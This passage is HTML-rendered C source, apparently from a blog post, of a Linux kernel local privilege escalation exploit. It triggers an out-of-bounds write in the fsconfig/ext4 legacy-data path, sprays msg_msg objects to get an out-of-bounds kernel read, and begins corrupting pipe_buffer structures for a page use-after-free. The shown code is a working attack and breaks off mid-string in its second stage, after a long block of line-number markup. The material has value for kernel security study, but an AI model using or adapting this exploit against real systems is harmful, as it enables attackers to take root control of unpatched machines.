class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief make an out-of-bound write to the next object in kmalloc-4k,</span><br><span class="hljs-comment"> * note that the buf before will always be appended to a &quot;,=&quot;,</span><br><span class="hljs-comment"> * for a ctx-legacy_data with 4095 bytes&#x27; data, the &#x27;,&#x27; will be the last byte,</span><br><span class="hljs-comment"> * and the &#x27;=&#x27; will always be on the first byte of the object nearby</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * @return int - the fd for filesystem context</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prepare_oob_write</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (0x1000 - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> fs_fd;    <br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SPRAY_NR 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SZ    (0x1000+0x20-sizeof(struct msg_msg)-sizeof(struct msg_msgseg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OOB_READ_SZ    (0x2000-sizeof(struct msg_msg)-sizeof(struct msg_msgseg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TYPE 0x41414141</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_SPRAY_NR 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR MSG_SPRAY_NR</span><br><br><span class="hljs-type">int</span> msqid[MSG_SPRAY_NR];<br><span class="hljs-type">int</span> seq_fd[SEQ_SPRAY_NR];<br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> fs_fd, victim_qidx = <span class="hljs-number">-1</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief We don&#x27;t need to leak anything here, we just need to occupy a 4k obj.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">occupy_4k_obj_by_msg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>], ktext_leak = <span class="hljs-number">-1</span>;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage I - corrupting msg_msg to leak kernel info and occupy a 4k obj&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating pipe...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at creating %d pipe.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating msg_queue and msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (MSG_SPRAY_NR - <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = get_msg_queue()) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at allocating %d queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create msg_queue!&quot;</span>);<br>        &#125;<br><br>        buf[<span class="hljs-number">0</span>] = i;<br>        buf[MSG_SZ / <span class="hljs-number">8</span>] = i;<br>        <span class="hljs-keyword">if</span> (write_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at writing %d queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating fs-&gt;legacy_data...&quot;</span>);<br>    fs_fd = prepare_oob_write();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating msg_queue and msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (MSG_SPRAY_NR - <span class="hljs-number">8</span>); i &lt; MSG_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = get_msg_queue()) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at allocating %d queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create msg_queue!&quot;</span>);<br>        &#125;<br><br>        buf[<span class="hljs-number">0</span>] = i;<br>        buf[MSG_SZ / <span class="hljs-number">8</span>] = i;<br>        <span class="hljs-keyword">if</span> (write_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at writing %d queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    puts(&quot;\n[*] Spray seq_operations...&quot;);</span><br><span class="hljs-comment">    for (int i = 0; i &lt; SEQ_SPRAY_NR; i++) &#123;</span><br><span class="hljs-comment">        if ((seq_fd[i] = open(&quot;/proc/self/stat&quot;, O_RDONLY)) &lt; 0) &#123;</span><br><span class="hljs-comment">            printf(&quot;[x] Failed at creating %d seq_file.\n&quot;, i);</span><br><span class="hljs-comment">            err_exit(&quot;FAILED to create seq_file!&quot;);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;*/</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts...&quot;</span>);<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;1919810ARTTNBA114514&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fsconfig() to overwrite the msg_msg-&gt;m_ts...&quot;</span>);<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;\xc8\x1f&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Tring to make an oob read...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_SPRAY_NR; i++) &#123;<br>        <span class="hljs-type">ssize_t</span> read_size;<br><br>        read_size = peek_msg(msqid[i], buf, OOB_READ_SZ, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (read_size &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at reading %d msg_queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to read msg_msg!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (read_size &gt; MSG_SZ) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found victim msg_msg at \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;%d\033[32m\033[1m msg_queue!\033[0m\n&quot;</span>, i);<br>            victim_qidx = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qidx == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to overwrite the header of msg_msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    for (int i = MSG_SZ / 8; i &lt; (OOB_READ_SZ / 8); i++) &#123;</span><br><span class="hljs-comment">        if (buf[i] &gt; 0xffffffff81000000 &amp;&amp; ((buf[i] &amp; 0xfff) == 0x4d0)) &#123;</span><br><span class="hljs-comment">            printf(&quot;[*] Leak kernel text addr: %lx\n&quot;, buf[i]);</span><br><span class="hljs-comment">            ktext_leak = buf[i];</span><br><span class="hljs-comment">            break;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    if (ktext_leak == -1) &#123;</span><br><span class="hljs-comment">        err_exit(&quot;FAILED to leak kernel text address!&quot;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    kernel_offset = ktext_leak - 0xffffffff813834d0;</span><br><span class="hljs-comment">    kernel_base += kernel_offset;</span><br><span class="hljs-comment">    printf(&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;, kernel_base);</span><br><span class="hljs-comment">    printf(&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;, kernel_offset);</span><br><span class="hljs-comment">    */</span><br>&#125;<br><br><span class="hljs-comment">/* for pipe escalation */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SND_PIPE_BUF_SZ 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRD_PIPE_BUF_SZ 192</span><br><br><span class="hljs-type">int</span> orig_pid, victim_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> snd_orig_pid = <span class="hljs-number">-1</span>, snd_vicitm_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> self_2nd_pipe_pid = <span class="hljs-number">-1</span>, self_3rd_pipe_pid = <span class="hljs-number">-1</span>, self_4th_pipe_pid = <span class="hljs-number">-1</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">info_pipe_buf</span>;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x8000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>        <span class="hljs-string">&quot;Stage II - corrupting pipe_buffer to make two pipes point to same page&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating 4k 